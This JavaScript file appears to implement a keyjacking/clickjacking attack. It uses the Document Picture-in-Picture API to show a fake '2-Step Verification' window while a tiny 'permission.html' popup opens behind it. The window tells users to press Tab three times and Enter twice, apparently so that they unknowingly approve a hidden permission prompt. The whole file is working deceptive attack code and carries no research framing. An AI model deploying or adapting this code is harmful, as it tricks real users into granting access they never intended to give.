let pipWindow;
let popupWindow; // Reference to the permission popup

async function openPip() {
  try {
    pipWindow = await documentPictureInPicture.requestWindow({
      width: 1000,
      height: 1000
    });
    const style = pipWindow.document.createElement('style');
    style.textContent = `

          body {

            display: flex;

            flex-direction: column;

            justify-content: center;

            align-items: center;

            height: 100vh;

            margin: 0;

            background-color: #f0f0f0;

            font-family: Arial, sans-serif;

          }

          .step-heading, #message, #confirm-button, #exit-message, #start-button  {

            font-size: 24px;

            text-align: center;

          }

          #message, #confirm-button, #exit-message, #start-button  {

            display: none;

            font-weight: bold;

            margin-top: 20px;

          }

          #confirm-button, #start-button {

      padding: 10px 20px;

      font-size: 16px;

      cursor: pointer;

      background-color: #0dd438;

      color: white;

      border: none;

      border-radius: 5px;

          }

        `;
    pipWindow.document.head.appendChild(style); // Create and add elements to PiP window

    createAndAppendElement(pipWindow, 'button', 'start-button', 'Click to Start 2-Step Verification process');
    createAndAppendElement(pipWindow, 'div', 'step1-heading', 'Step 1:', 'none', 'step-heading');
    createAndAppendElement(pipWindow, 'div', 'message', 'Press Tab 3 times and then hit confirm for step 2', 'none');
    createAndAppendElement(pipWindow, 'button', 'confirm-button', 'Confirm', 'none');
    createAndAppendElement(pipWindow, 'div', 'step2-heading', 'Step 2:', 'none', 'step-heading');
    createAndAppendElement(pipWindow, 'div', 'exit-message', 'Press Enter twice to Exit and verify', 'none'); // Add event listeners

    addEventListeners(pipWindow);
  } catch (error) {
    console.error('Error opening PiP window:', error);
  }
}

function createAndAppendElement(pipWindow, tagName, id, textContent, display = 'block', className = '') {
  const element = pipWindow.document.createElement(tagName);
  element.id = id;
  element.textContent = textContent;
  element.style.display = display;

  if (className) {
    element.className = className;
  }

  pipWindow.document.body.appendChild(element);
}

function addEventListeners(pipWindow) {
  // Start button click event
  const startButton = pipWindow.document.getElementById('start-button');
  startButton.addEventListener('click', () => {
    popupWindow = window.open('permission.html', 'popupWindow', 'width=100,height=100,left=850,top=650');
    startButton.style.display = 'none';
    pipWindow.document.getElementById('step1-heading').style.display = 'block';
    pipWindow.document.getElementById('message').style.display = 'block';
    pipWindow.document.getElementById('confirm-button').style.display = 'block';
  }); // Confirm button click event

  const confirmButton = pipWindow.document.getElementById('confirm-button');
  confirmButton.addEventListener('click', () => {
    pipWindow.document.getElementById('step1-heading').style.display = 'none';
    pipWindow.document.getElementById('message').style.display = 'none';
    confirmButton.style.display = 'none';
    pipWindow.document.getElementById('step2-heading').style.display = 'block';
    pipWindow.document.getElementById('exit-message').style.display = 'block';
  }); // Exit on Enter key press

  pipWindow.addEventListener('keydown', event => {
    if (event.key === 'Enter') {
      pipWindow.close(); // Close the permission popup after few seconds

      setTimeout(() => {
        if (popupWindow) {
          popupWindow.close();
        }
      }, 500);
    }
  });
}